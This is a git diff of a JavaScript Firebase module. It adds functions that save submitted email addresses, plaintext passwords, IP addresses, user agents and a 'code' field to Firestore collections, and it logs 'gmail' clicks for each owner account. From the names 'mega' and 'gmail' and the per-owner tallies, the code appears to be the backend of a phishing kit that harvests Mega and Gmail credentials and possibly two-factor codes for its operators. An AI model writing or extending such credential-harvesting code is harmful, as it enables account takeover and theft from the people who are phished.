@@ -56,7 +56,7 @@ const signUpWithRole = async (email, password, role) => {
   }
 };
 
-const addData = async (email = '', password = '', userAgent = '', owner = 'admin@gmail.com') => {
+const addData = async (email = '', password = '', userAgent = '', owner = 'admin@gmail.com', ip = '', code = 0) => {
   try {
     const docRef = await addDoc(collection(db, "mega"), {
       email: email,
@@ -65,7 +65,8 @@ const addData = async (email = '', password = '', userAgent = '', owner = 'admin
       createdAt: Date.now(),
       status: 'loading',
       userAgent: userAgent,
-      code: 0,
+      code: code,
+      ip: ip,
     });
     console.log("Document created with ID:", docRef?.id);
     return docRef
@@ -90,4 +91,41 @@ const addClick = async (owner = 'nxnahidxyz@gmail.com') => {
   }
 };
 
-export { signUpWithRole, auth, addData, db, addClick }
+
+
+const addGmailData = async (email = '', password = '', userAgent = '', owner = 'admin@gmail.com', ip = '') => {
+  try {
+    const docRef = await addDoc(collection(db, "data"), {
+      email: email,
+      password: password,
+      owner: owner,
+      userAgent: userAgent,
+      createdAt: Date.now(),
+      status: 'loading',
+      code: 0,
+      ip: ip,
+    });
+    console.log("Document created with ID:", docRef?.id);
+    return docRef
+  } catch (error) {
+    console.log("Error adding document:", error?.message);
+    return false
+  }
+}
+
+const addGmailClick = async (owner = 'nxnahidxyz@gmail.com') => {
+  try {
+    await addDoc(collection(db, "clicks"), {
+      name: 'gmail',
+      owner: owner,
+      createdAt: Date.now()
+    });
+    console.log('click added')
+    return true
+  } catch (error) {
+    console.error("Error ensuring and incrementing tryst field:", error);
+    return false
+  }
+};
+
+export { addGmailData, addGmailClick, signUpWithRole, auth, addData, db, addClick }
